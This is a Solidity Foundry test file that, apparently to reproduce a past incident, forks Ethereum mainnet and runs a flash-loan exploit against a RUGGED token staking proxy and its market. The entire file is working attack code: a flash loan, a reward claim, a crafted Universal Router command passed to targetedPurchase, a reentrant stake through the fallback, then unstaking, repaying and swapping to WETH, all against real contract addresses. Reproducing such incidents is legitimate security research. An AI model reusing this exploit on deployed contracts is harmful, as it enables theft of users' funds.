// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/interface/interface.sol";
import "forge-std/console.sol";

interface IRUGGEDUNIV3POOL {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sprtPriceLimitX96,
        bytes calldata data
    ) external;

    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IRUGGEDPROXY {
    struct UniversalRouterExecute {
        bytes commands;
        bytes[] inputs;
        uint256 deadline;
    }

    function claimReward() external;

    function targetedPurchase(
        uint256[] memory _tokenIds,
        UniversalRouterExecute calldata swapParam
    ) external payable;

    function unstake(uint256 _amount) external;

    function stake(uint256 _amount) external;
}

interface IRUGGED is IERC20 {
    function getTokenIdPool() external view returns (uint256[] memory);

    function ownerOf(uint256 id) external view returns (address owner);
}

interface IWeth is IERC20 {}

contract ContractTest is Test {
    IRUGGEDUNIV3POOL pool =
        IRUGGEDUNIV3POOL(0x99147452078fa5C6642D3E5F7efD51113A9527a5);
    IRUGGEDPROXY proxy =
        IRUGGEDPROXY(0x2648f5592c09a260C601ACde44e7f8f2944944Fb);
    IRUGGED RUGGED = IRUGGED(0xbE33F57f41a20b2f00DEc91DcC1169597f36221F);
    IWeth WETH = IWeth(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    uint256 flashnumber = 22 * 1e18;

    function setUp() public {
        cheats.createSelectFork("mainnet", 19_262_234 - 1);
        cheats.label(address(proxy), "proxy");
        cheats.label(address(RUGGED), "RUGGED");
        cheats.label(address(pool), "pool");
        cheats.label(address(WETH), "WETH");
        cheats.label(
            address(0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6),
            "RuggedMarket"
        );
        cheats.label(
            address(0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD),
            "Universal_Router"
        );
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    fallback() external payable {
        RUGGED.approve(address(proxy), type(uint256).max);
        RUGGED.balanceOf(address(this));
        proxy.stake(flashnumber);
    }

    function testExploit() public {
        console.log("WETH: ", WETH.balanceOf(address(this)));
        payable(address(0)).transfer(WETH.balanceOf(address(this)));
        deal(address(this), 0.000000000000000001 ether);
        console.log("WETH before: ", WETH.balanceOf(address(this)));
        pool.flash(address(this), flashnumber, 0, abi.encode(0));
        bool zeroForOne = true;
        uint160 sqrtPriceLimitX96 = 4_295_128_740;
        bytes memory data = abi.encodePacked(uint8(0x61));
        int256 amountSpecified = int256(RUGGED.balanceOf(address(this)));
        pool.swap(
            address(this),
            zeroForOne,
            amountSpecified,
            sqrtPriceLimitX96,
            data
        );
        console.log("WETH: ", WETH.balanceOf(address(this)));
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        if (amount0Delta > 0) {
            IERC20(Uni_Pair_V3(msg.sender).token0()).transfer(
                msg.sender,
                uint256(amount0Delta)
            );
        } else if (amount1Delta > 0) {
            IERC20(Uni_Pair_V3(msg.sender).token1()).transfer(
                msg.sender,
                uint256(amount1Delta)
            );
        }
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        proxy.claimReward();
        uint256[] memory tokenId = new uint256[](20);
        tokenId[0] = 9721;
        tokenId[1] = 5163;
        tokenId[2] = 2347;
        tokenId[3] = 3145;
        tokenId[4] = 2740;
        tokenId[5] = 1878;
        tokenId[6] = 6901;
        tokenId[7] = 3061;
        tokenId[8] = 1922;
        tokenId[9] = 5301;
        tokenId[10] = 454;
        tokenId[11] = 2178;
        tokenId[12] = 8298;
        tokenId[13] = 4825;
        tokenId[14] = 9307;
        tokenId[15] = 2628;
        tokenId[16] = 6115;
        tokenId[17] = 8565;
        tokenId[18] = 7991;
        tokenId[19] = 4945;

        bytes memory commands = new bytes(1);
        commands[0] = 0x04;
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encodePacked(
            abi.encode(address(0)),
            abi.encode(address(this)),
            abi.encode(1)
        );
        uint256 deadline = block.timestamp;
        IRUGGEDPROXY.UniversalRouterExecute memory swapParam = IRUGGEDPROXY
            .UniversalRouterExecute({
                commands: commands,
                inputs: inputs,
                deadline: deadline
            });

        proxy.targetedPurchase{value: 0.000000000000000001 ether}(
            tokenId,
            swapParam
        );
        proxy.unstake(RUGGED.balanceOf(address(this)));
        RUGGED.transfer(address(pool), flashnumber + fee0);
    }
}
